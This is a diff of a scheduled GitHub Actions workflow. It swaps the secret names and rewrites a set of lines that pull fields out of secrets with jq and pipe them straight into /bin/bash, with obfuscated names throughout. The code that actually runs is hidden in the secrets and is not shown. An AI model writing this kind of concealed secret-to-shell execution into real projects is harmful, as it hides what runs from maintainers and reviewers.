@@ -1,29 +1,26 @@
 name: yangtianbao2001
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 0/6 * * *'
+    - cron: '52 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yangtianbao2001
         env:
-          zepss0: ${{ secrets.zepss0 }}
+          u13: ${{ secrets.u13 }}
         run: |
-          echo $zepss0 | jq -r .r8 | /bin/bash
-          echo $y97337 | jq -r .qalav2 | /bin/bash
-          echo $reex19 | jq -r .wbw9301 | /bin/bash
-          echo $bujy95481 | jq -r .cwo85370 | /bin/bash
-          echo $zjy930 | jq -r .y4 | /bin/bash
-          echo $gktks873 | jq -r .ywnx00 | /bin/bash
-          echo $gpsqo0 | jq -r .uesa484 | /bin/bash
-          echo $jxk809 | jq -r .taxux1485 | /bin/bash
-          echo $ee332 | jq -r .g8 | /bin/bash
-          echo $wud4 | jq -r .w280 | /bin/bash
-          echo $ko75497 | jq -r .dl4 | /bin/bash
-          echo $gnv6 | jq -r .vo37 | /bin/bash
-          echo $gnhna7 | jq -r .gctkk273 | /bin/bash
+          echo $u13 | jq -r .zlig63 | /bin/bash
+          echo $oxyz146 | jq -r .sqf86289 | /bin/bash
+          echo $tvadf08503 | jq -r .ytgo1718 | /bin/bash
+          echo $pzktv26 | jq -r .uzbdn2 | /bin/bash
+          echo $eb42305 | jq -r .iz8631 | /bin/bash
+          echo $hxfav76939 | jq -r .gys6422 | /bin/bash
+          echo $m9 | jq -r .qkx349 | /bin/bash
+          echo $el272 | jq -r .vdx64655 | /bin/bash
 
